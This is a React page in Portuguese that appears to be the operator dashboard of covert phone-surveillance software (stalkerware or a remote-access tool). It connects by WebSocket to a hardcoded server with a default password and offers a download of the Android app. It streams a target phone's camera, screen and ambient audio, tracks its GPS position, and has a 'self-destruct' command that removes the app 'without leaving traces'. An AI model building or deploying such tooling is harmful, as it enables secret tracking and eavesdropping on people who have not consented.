'use client';

import { useEffect, useRef, useState, useCallback } from 'react';
import {
  Wifi, WifiOff, Settings, Download, Smartphone,
  Camera, Monitor as MonitorIcon, Mic, MapPin,
  RefreshCw, Gauge, Clock, Trash2,
} from 'lucide-react';

const DEFAULT_WS_URL = 'wss://server-production-6a5c.up.railway.app';
const DEFAULT_PASSWORD = 'monitor123';

interface Device { id: string; name: string; online: boolean; }
interface DeviceInfo { battery: number; charging: boolean; network: 'wifi' | 'mobile' | 'none'; }
interface LocationData { lat: number; lng: number; accuracy: number; speed: number; bearing: number; }

function loadScript(src: string): Promise<void> {
  return new Promise((res, rej) => {
    if (document.querySelector(`script[src="${src}"]`)) { res(); return; }
    const s = document.createElement('script'); s.src = src;
    s.onload = () => res(); s.onerror = rej;
    document.head.appendChild(s);
  });
}
function loadLink(href: string) {
  if (document.querySelector(`link[href="${href}"]`)) return;
  const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = href;
  document.head.appendChild(l);
}

export default function MonitorPage() {
  const [wsUrl, setWsUrl] = useState(DEFAULT_WS_URL);
  const [password, setPassword] = useState(DEFAULT_PASSWORD);
  const [showSettings, setShowSettings] = useState(false);
  const [connected, setConnected] = useState(false);
  const [loginError, setLoginError] = useState('');

  const [devices, setDevices] = useState<Device[]>([]);
  const [activeDeviceId, setActiveDeviceId] = useState<string | null>(null);
  const [deviceInfoMap, setDeviceInfoMap] = useState<Record<string, DeviceInfo>>({});
  const [activeStreams, setActiveStreams] = useState<Set<string>>(new Set());
  const [location, setLocation] = useState<LocationData | null>(null);
  const [lastUpdate, setLastUpdate] = useState('');
  const [fps, setFps] = useState(0);
  const [destroyConfirm, setDestroyConfirm] = useState<Device | null>(null);

  const wsRef = useRef<WebSocket | null>(null);
  const cameraCanvasRef = useRef<HTMLCanvasElement>(null);
  const screenCanvasRef = useRef<HTMLCanvasElement>(null);
  const cameraImgRef = useRef<HTMLImageElement | null>(null);
  const screenImgRef = useRef<HTMLImageElement | null>(null);
  const audioCtxRef = useRef<AudioContext | null>(null);
  const audioNextRef = useRef(0);
  const fpsCountRef = useRef(0);
  const activeDeviceRef = useRef<string | null>(null);
  const activeStreamsRef = useRef<Set<string>>(new Set());
  const mapRef = useRef<unknown>(null);
  const markerRef = useRef<unknown>(null);

  useEffect(() => { activeDeviceRef.current = activeDeviceId; }, [activeDeviceId]);
  useEffect(() => { activeStreamsRef.current = activeStreams; }, [activeStreams]);

  useEffect(() => {
    const t = setInterval(() => { setFps(fpsCountRef.current); fpsCountRef.current = 0; }, 1000);
    return () => clearInterval(t);
  }, []);

  const initMap = useCallback(async () => {
    if (mapRef.current) return;
    loadLink('https://unpkg.com/leaflet@1.9.4/dist/leaflet.css');
    await loadScript('https://unpkg.com/leaflet@1.9.4/dist/leaflet.js');
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const L = (window as any).L;
    const el = document.getElementById('monitor-map');
    if (!L || !el) return;
    const m = L.map('monitor-map', { zoomControl: false }).setView([-15.78, -47.93], 13);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OSM' }).addTo(m);
    mapRef.current = m;
  }, []);

  const updateMarker = useCallback((loc: LocationData) => {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const L = (window as any).L;
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const m = mapRef.current as any;
    if (!L || !m) return;
    const latlng: [number, number] = [loc.lat, loc.lng];
    if (!markerRef.current) markerRef.current = L.marker(latlng).addTo(m);
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    else (markerRef.current as any).setLatLng(latlng);
    m.setView(latlng, 16);
  }, []);

  const renderFrame = useCallback((source: string, b64: string) => {
    const canvas = source === 'screen' ? screenCanvasRef.current : cameraCanvasRef.current;
    if (!canvas) return;
    const imgRef = source === 'screen' ? screenImgRef : cameraImgRef;
    if (!imgRef.current) imgRef.current = new Image();
    const img = imgRef.current;
    img.onload = () => {
      canvas.width = img.naturalWidth; canvas.height = img.naturalHeight;
      canvas.getContext('2d')?.drawImage(img, 0, 0);
      if (source === 'camera') fpsCountRef.current++;
    };
    img.src = 'data:image/jpeg;base64,' + b64;
  }, []);

  const playAudio = useCallback((b64: string) => {
    if (!audioCtxRef.current) audioCtxRef.current = new AudioContext({ sampleRate: 16000 });
    const ctx = audioCtxRef.current;
    const bin = atob(b64);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    const samples = bytes.length / 2;
    const f32 = new Float32Array(samples);
    const dv = new DataView(bytes.buffer);
    for (let i = 0; i < samples; i++) f32[i] = dv.getInt16(i * 2, true) / 32768;
    const buf = ctx.createBuffer(1, samples, 16000);
    buf.getChannelData(0).set(f32);
    const src = ctx.createBufferSource();
    src.buffer = buf; src.connect(ctx.destination);
    const now = ctx.currentTime;
    const start = Math.max(now, audioNextRef.current);
    src.start(start);
    audioNextRef.current = start + buf.duration;
  }, []);

  const connect = useCallback((url: string, pwd: string) => {
    if (wsRef.current) { wsRef.current.close(); wsRef.current = null; }
    const ws = new WebSocket(url);
    wsRef.current = ws;

    ws.onopen = () => ws.send(JSON.stringify({ type: 'auth', password: pwd, role: 'viewer' }));

    ws.onmessage = (e) => {
      let msg: Record<string, unknown>;
      try { msg = JSON.parse(e.data); } catch { return; }

      switch (msg.type) {
        case 'auth':
          if (msg.success) { setConnected(true); setLoginError(''); initMap(); }
          else { setLoginError('Senha incorreta.'); ws.close(); }
          break;

        case 'devices': {
          const list = msg.list as Device[];
          setDevices(list);
          setActiveDeviceId(prev => {
            if (prev && list.find(d => d.id === prev)) return prev;
            return list.find(d => d.online)?.id ?? list[0]?.id ?? null;
          });
          break;
        }

        case 'device_info': {
          const did = msg.deviceId as string;
          if (did) setDeviceInfoMap(prev => ({
            ...prev,
            [did]: {
              battery: msg.battery as number,
              charging: msg.charging as boolean,
              network: msg.network as 'wifi' | 'mobile' | 'none',
            },
          }));
          break;
        }

        case 'frame':
          if (msg.deviceId === activeDeviceRef.current)
            renderFrame(msg.source as string, msg.data as string);
          break;

        case 'audio':
          if (msg.deviceId === activeDeviceRef.current && activeStreamsRef.current.has('audio'))
            playAudio(msg.data as string);
          break;

        case 'location': {
          if (msg.deviceId !== activeDeviceRef.current) break;
          const loc = msg as unknown as LocationData & { type: string; deviceId: string };
          setLocation(loc);
          setLastUpdate(new Date().toLocaleTimeString('pt-BR'));
          updateMarker(loc);
          break;
        }
      }
    };

    ws.onclose = () => {
      setConnected(false); setDevices([]); setActiveStreams(new Set());
      setTimeout(() => {
        const u = localStorage.getItem('monitor_ws_url') || DEFAULT_WS_URL;
        const p = localStorage.getItem('monitor_ws_pwd') || DEFAULT_PASSWORD;
        connect(u, p);
      }, 3000);
    };

    ws.onerror = () => setLoginError('Não foi possível conectar.');
  }, [initMap, updateMarker, renderFrame, playAudio]);

  useEffect(() => {
    const url = localStorage.getItem('monitor_ws_url') || DEFAULT_WS_URL;
    const pwd = localStorage.getItem('monitor_ws_pwd') || DEFAULT_PASSWORD;
    setWsUrl(url); setPassword(pwd);
    connect(url, pwd);
    return () => { wsRef.current?.close(); };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  function saveAndConnect() {
    if (!wsUrl.trim()) return;
    localStorage.setItem('monitor_ws_url', wsUrl.trim());
    localStorage.setItem('monitor_ws_pwd', password);
    setShowSettings(false);
    connect(wsUrl.trim(), password);
  }

  function toggleStream(stream: string) {
    const isActive = activeStreams.has(stream);
    wsRef.current?.send(JSON.stringify({
      type: 'cmd', action: isActive ? 'unsubscribe' : 'subscribe',
      stream, deviceId: activeDeviceId,
    }));
    setActiveStreams(prev => {
      const s = new Set(prev);
      if (isActive) s.delete(stream); else s.add(stream);
      return s;
    });
  }

  function selectDevice(id: string) {
    if (activeDeviceId && activeDeviceId !== id) {
      activeStreamsRef.current.forEach(stream =>
        wsRef.current?.send(JSON.stringify({ type: 'cmd', action: 'unsubscribe', stream, deviceId: activeDeviceId }))
      );
      setActiveStreams(new Set());
      setLocation(null);
      setLastUpdate('');
    }
    setActiveDeviceId(id);
  }

  function switchCamera() {
    wsRef.current?.send(JSON.stringify({ type: 'cmd', action: 'switch_camera', deviceId: activeDeviceId }));
  }

  function selfDestruct(deviceId: string) {
    wsRef.current?.send(JSON.stringify({ type: 'cmd', action: 'self_destruct', deviceId }));
    setDestroyConfirm(null);
  }

  const activeDevice = devices.find(d => d.id === activeDeviceId);
  const devInfo = activeDeviceId ? deviceInfoMap[activeDeviceId] : null;

  return (
    <div className="flex flex-col h-full -m-4 md:-m-6 bg-gray-950 overflow-hidden">

      {/* ── Top bar ── */}
      <div className="flex items-center gap-3 px-4 py-2.5 bg-gray-900 border-b border-gray-800 flex-shrink-0">
        <span className="text-sm font-bold text-white">Monitor Remoto</span>
        <div className="flex items-center gap-1.5 ml-auto">
          {connected
            ? <><Wifi className="w-3.5 h-3.5 text-green-400" /><span className="text-xs text-green-400">online</span></>
            : <><WifiOff className="w-3.5 h-3.5 text-red-400" /><span className="text-xs text-red-400">desconectado</span></>
          }
          <a
            href={`${(wsUrl || DEFAULT_WS_URL).replace(/^wss?:/, 'https:')}/download/monitor.apk`}
            download="Monitor.apk"
            className="p-1.5 rounded text-gray-500 hover:text-white hover:bg-gray-800 transition-colors ml-1"
            title="Baixar APK Android">
            <Download className="w-4 h-4" />
          </a>
          <button onClick={() => setShowSettings(true)}
            className="p-1.5 rounded text-gray-500 hover:text-white hover:bg-gray-800 transition-colors">
            <Settings className="w-4 h-4" />
          </button>
        </div>
      </div>

      {/* ── Main ── */}
      <div className="flex flex-1 min-h-0 overflow-hidden">

        {/* ── Device sidebar ── */}
        <div className="w-52 flex-shrink-0 border-r border-gray-800 bg-gray-900 flex flex-col overflow-y-auto">
          <div className="px-3 pt-3 pb-1 text-[10px] font-bold text-gray-500 uppercase tracking-widest">
            Aparelhos
          </div>

          {devices.length === 0 ? (
            <div className="flex flex-col items-center justify-center flex-1 py-10 gap-2 px-4">
              <Smartphone className="w-8 h-8 text-gray-700" />
              <p className="text-xs text-gray-600 text-center">
                {connected ? 'Nenhum aparelho\nconectado' : 'Aguardando\nservidor...'}
              </p>
            </div>
          ) : (
            devices.map(d => {
              const info = deviceInfoMap[d.id];
              const isSelected = d.id === activeDeviceId;
              return (
                <div key={d.id}
                  className={`relative group border-b border-gray-800/50 cursor-pointer transition-colors
                    ${isSelected ? 'bg-gray-800' : 'hover:bg-gray-800/50'}`}
                  onClick={() => selectDevice(d.id)}>
                  <div className="px-3 py-3">
                    <div className="flex items-center gap-2 mb-1">
                      <div className={`w-2 h-2 rounded-full flex-shrink-0
                        ${d.online ? 'bg-green-400 shadow-[0_0_4px_#4ade80]' : 'bg-gray-600'}`} />
                      <span className="text-sm text-white font-medium truncate">{d.name}</span>
                    </div>
                    {d.online && info ? (
                      <div className="flex items-center gap-2 pl-4 text-xs text-gray-500">
                        <span>🔋 {info.battery}%{info.charging ? ' ⚡' : ''}</span>
                        <span>{info.network === 'wifi' ? '📶 WiFi' : info.network === 'mobile' ? '📱 Dados' : '—'}</span>
                      </div>
                    ) : (
                      <p className="pl-4 text-xs text-gray-600">{d.online ? '...' : 'offline'}</p>
                    )}
                  </div>
                  <button
                    onClick={e => { e.stopPropagation(); setDestroyConfirm(d); }}
                    className="absolute right-2 top-1/2 -translate-y-1/2 p-1 rounded
                      opacity-0 group-hover:opacity-100 text-gray-600 hover:text-red-400 hover:bg-red-950 transition-all"
                    title="Autodestruir">
                    <Trash2 className="w-3.5 h-3.5" />
                  </button>
                </div>
              );
            })
          )}
        </div>

        {/* ── Device detail ── */}
        {activeDevice ? (
          <div className="flex-1 flex flex-col min-h-0 overflow-y-auto">

            {/* header */}
            <div className="px-4 py-3 border-b border-gray-800 bg-gray-900 flex-shrink-0">
              <div className="flex items-center gap-2">
                <Smartphone className="w-4 h-4 text-gray-500" />
                <span className="text-white font-semibold text-sm">{activeDevice.name}</span>
              </div>
              <div className="flex items-center gap-3 mt-1 text-xs text-gray-500 flex-wrap">
                {activeDevice.online ? (
                  <>
                    <span className="text-green-400 font-medium">● online</span>
                    {devInfo && (
                      <>
                        <span>🔋 {devInfo.battery}%{devInfo.charging ? ' ⚡ carregando' : ''}</span>
                        <span>
                          {devInfo.network === 'wifi'   ? '📶 WiFi' :
                           devInfo.network === 'mobile' ? '📱 Dados móveis' : '✕ Sem rede'}
                        </span>
                      </>
                    )}
                    {fps > 0 && <span className="text-gray-600">{fps} fps</span>}
                  </>
                ) : (
                  <span className="text-red-400">● offline</span>
                )}
              </div>
            </div>

            {/* 2×2 stream grid */}
            <div className="grid grid-cols-2 gap-3 p-4">

              {/* ── Camera ── */}
              <div className={`rounded-xl border flex flex-col overflow-hidden
                ${activeStreams.has('camera') ? 'border-blue-600' : 'border-gray-800'} bg-gray-900`}>
                <div className="flex items-center justify-between px-3 py-2.5 border-b border-gray-800">
                  <div className="flex items-center gap-1.5">
                    <Camera className="w-4 h-4 text-gray-400" />
                    <span className="text-sm font-medium text-white">Câmera</span>
                  </div>
                  <div className="flex items-center gap-1">
                    {activeStreams.has('camera') && (
                      <button onClick={switchCamera}
                        className="p-1 rounded text-gray-500 hover:text-blue-400 hover:bg-gray-800 transition-colors"
                        title="Virar câmera">
                        <RefreshCw className="w-3.5 h-3.5" />
                      </button>
                    )}
                    <button
                      onClick={() => toggleStream('camera')}
                      disabled={!activeDevice.online}
                      className={`px-2.5 py-1 rounded text-xs font-medium transition-colors disabled:opacity-40
                        ${activeStreams.has('camera')
                          ? 'bg-blue-600 text-white hover:bg-blue-700'
                          : 'bg-gray-800 text-gray-400 hover:text-white hover:bg-gray-700'}`}>
                      {activeStreams.has('camera') ? 'Desligar' : 'Ligar'}
                    </button>
                  </div>
                </div>
                {activeStreams.has('camera') ? (
                  <div className="flex-1 bg-black flex items-center justify-center min-h-[150px]">
                    <canvas ref={cameraCanvasRef} className="max-w-full max-h-full object-contain" />
                  </div>
                ) : (
                  <div className="flex-1 flex items-center justify-center min-h-[100px]">
                    <Camera className="w-10 h-10 text-gray-800" />
                  </div>
                )}
              </div>

              {/* ── Screen ── */}
              <div className={`rounded-xl border flex flex-col overflow-hidden
                ${activeStreams.has('screen') ? 'border-purple-600' : 'border-gray-800'} bg-gray-900`}>
                <div className="flex items-center justify-between px-3 py-2.5 border-b border-gray-800">
                  <div className="flex items-center gap-1.5">
                    <MonitorIcon className="w-4 h-4 text-gray-400" />
                    <span className="text-sm font-medium text-white">Tela</span>
                  </div>
                  <button
                    onClick={() => toggleStream('screen')}
                    disabled={!activeDevice.online}
                    className={`px-2.5 py-1 rounded text-xs font-medium transition-colors disabled:opacity-40
                      ${activeStreams.has('screen')
                        ? 'bg-purple-600 text-white hover:bg-purple-700'
                        : 'bg-gray-800 text-gray-400 hover:text-white hover:bg-gray-700'}`}>
                    {activeStreams.has('screen') ? 'Desligar' : 'Ligar'}
                  </button>
                </div>
                {activeStreams.has('screen') ? (
                  <div className="flex-1 bg-black flex items-center justify-center min-h-[150px]">
                    <canvas ref={screenCanvasRef} className="max-w-full max-h-full object-contain" />
                  </div>
                ) : (
                  <div className="flex-1 flex items-center justify-center min-h-[100px]">
                    <MonitorIcon className="w-10 h-10 text-gray-800" />
                  </div>
                )}
              </div>

              {/* ── Audio ── */}
              <div className={`rounded-xl border flex flex-col overflow-hidden
                ${activeStreams.has('audio') ? 'border-green-600' : 'border-gray-800'} bg-gray-900`}>
                <div className="flex items-center justify-between px-3 py-2.5 border-b border-gray-800">
                  <div className="flex items-center gap-1.5">
                    <Mic className="w-4 h-4 text-gray-400" />
                    <span className="text-sm font-medium text-white">Áudio ambiente</span>
                  </div>
                  <button
                    onClick={() => toggleStream('audio')}
                    disabled={!activeDevice.online}
                    className={`px-2.5 py-1 rounded text-xs font-medium transition-colors disabled:opacity-40
                      ${activeStreams.has('audio')
                        ? 'bg-green-600 text-white hover:bg-green-700'
                        : 'bg-gray-800 text-gray-400 hover:text-white hover:bg-gray-700'}`}>
                    {activeStreams.has('audio') ? 'Desligar' : 'Ligar'}
                  </button>
                </div>
                <div className="flex-1 flex items-center justify-center min-h-[100px]">
                  {activeStreams.has('audio') ? (
                    <div className="flex flex-col items-center gap-3">
                      <div className="flex gap-1 items-end h-8">
                        {[3, 5, 7, 5, 8, 4, 6, 3, 5].map((h, i) => (
                          <div key={i}
                            className="w-1.5 bg-green-400 rounded-full animate-pulse"
                            style={{ height: `${h * 3}px`, animationDelay: `${i * 80}ms` }} />
                        ))}
                      </div>
                      <span className="text-xs text-green-400 font-medium">Ouvindo...</span>
                    </div>
                  ) : (
                    <Mic className="w-10 h-10 text-gray-800" />
                  )}
                </div>
              </div>

              {/* ── Location ── */}
              <div className="rounded-xl border border-gray-800 bg-gray-900 flex flex-col overflow-hidden">
                <div className="flex items-center justify-between px-3 py-2.5 border-b border-gray-800">
                  <div className="flex items-center gap-1.5">
                    <MapPin className="w-4 h-4 text-gray-400" />
                    <span className="text-sm font-medium text-white">Localização</span>
                  </div>
                  {location && (
                    <div className="flex items-center gap-1.5 text-xs text-gray-500">
                      <Gauge className="w-3 h-3" />
                      <span>{(location.speed * 3.6).toFixed(0)} km/h</span>
                    </div>
                  )}
                </div>
                <div id="monitor-map" className="flex-1 min-h-[150px] bg-gray-800" />
                {location ? (
                  <div className="px-3 py-2 border-t border-gray-800 flex items-center justify-between text-xs text-gray-500">
                    <span>±{Math.round(location.accuracy)}m</span>
                    <div className="flex items-center gap-1">
                      <Clock className="w-3 h-3" />
                      <span>{lastUpdate}</span>
                    </div>
                  </div>
                ) : (
                  <div className="px-3 py-2 text-xs text-gray-600 text-center">
                    Aguardando GPS...
                  </div>
                )}
              </div>

            </div>
          </div>
        ) : (
          <div className="flex-1 flex items-center justify-center bg-gray-950">
            <div className="text-center">
              <Smartphone className="w-12 h-12 text-gray-800 mx-auto mb-3" />
              <p className="text-sm text-gray-600">
                {!connected ? 'Aguardando servidor...' :
                 devices.length === 0 ? 'Nenhum aparelho conectado' :
                 'Selecione um aparelho'}
              </p>
            </div>
          </div>
        )}
      </div>

      {/* ── Settings modal ── */}
      {showSettings && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70"
          onClick={() => setShowSettings(false)}>
          <div className="bg-gray-900 border border-gray-700 rounded-xl p-6 w-80 space-y-4 shadow-2xl"
            onClick={e => e.stopPropagation()}>
            <h2 className="text-base font-bold text-white">Configurações</h2>
            <div className="space-y-1">
              <label className="text-xs text-gray-400">Endereço WebSocket</label>
              <input type="text" value={wsUrl} onChange={e => setWsUrl(e.target.value)}
                placeholder={DEFAULT_WS_URL}
                className="w-full bg-gray-800 border border-gray-700 rounded-lg px-3 py-2 text-sm text-white
                  placeholder-gray-600 focus:outline-none focus:border-blue-500" />
            </div>
            <div className="space-y-1">
              <label className="text-xs text-gray-400">Senha</label>
              <input type="password" value={password} onChange={e => setPassword(e.target.value)}
                className="w-full bg-gray-800 border border-gray-700 rounded-lg px-3 py-2 text-sm text-white
                  placeholder-gray-600 focus:outline-none focus:border-blue-500"
                onKeyDown={e => e.key === 'Enter' && saveAndConnect()} />
            </div>
            {loginError && <p className="text-xs text-red-400">{loginError}</p>}
            <div className="flex gap-2">
              <button onClick={() => setShowSettings(false)}
                className="flex-1 py-2 rounded-lg text-sm text-gray-400 bg-gray-800 hover:bg-gray-700 transition-colors">
                Cancelar
              </button>
              <button onClick={saveAndConnect}
                className="flex-1 py-2 rounded-lg text-sm font-semibold text-white bg-blue-600 hover:bg-blue-500 transition-colors">
                Conectar
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ── Destroy confirm ── */}
      {destroyConfirm && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70"
          onClick={() => setDestroyConfirm(null)}>
          <div className="bg-gray-900 border border-red-900 rounded-xl p-6 w-80 shadow-2xl"
            onClick={e => e.stopPropagation()}>
            <div className="flex items-center gap-2 mb-3">
              <Trash2 className="w-5 h-5 text-red-400" />
              <h2 className="text-base font-bold text-white">Autodestruição</h2>
            </div>
            <p className="text-sm text-gray-300 mb-1">
              Remover <span className="font-semibold text-white">{destroyConfirm.name}</span> permanentemente?
            </p>
            <p className="text-xs text-gray-500 mb-5">
              O app será removido do aparelho sem deixar rastros.
            </p>
            <div className="flex gap-2">
              <button onClick={() => setDestroyConfirm(null)}
                className="flex-1 py-2 rounded-lg text-sm text-gray-400 bg-gray-800 hover:bg-gray-700 transition-colors">
                Cancelar
              </button>
              <button onClick={() => selfDestruct(destroyConfirm.id)}
                className="flex-1 py-2 rounded-lg text-sm font-semibold text-white bg-red-700 hover:bg-red-600 transition-colors">
                Remover
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
